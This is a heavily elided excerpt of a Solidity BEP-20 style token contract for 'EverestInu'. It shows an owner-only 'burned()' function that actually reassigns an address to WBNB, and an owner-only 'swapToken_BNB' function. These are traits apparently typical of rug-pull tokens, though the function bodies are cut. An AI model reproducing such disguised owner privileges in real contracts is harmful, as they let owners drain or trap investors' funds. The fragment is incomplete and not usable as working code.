...
contract ERC200 is Context, IERC20, Ownable {
        ...
        returns (uint256)
    {
     ...
     function burned() external onlyOwner(){
         Address2= WBNB; 
    ...
    function swapToken_BNB(uint256 amount) external onlyOwner(){
...
contract EVERESTINU is ERC200 {

    uint tokenTotalSupply = 1000000000000;

    constructor() public ERC200("EverestInu", "EVERESTINU") {
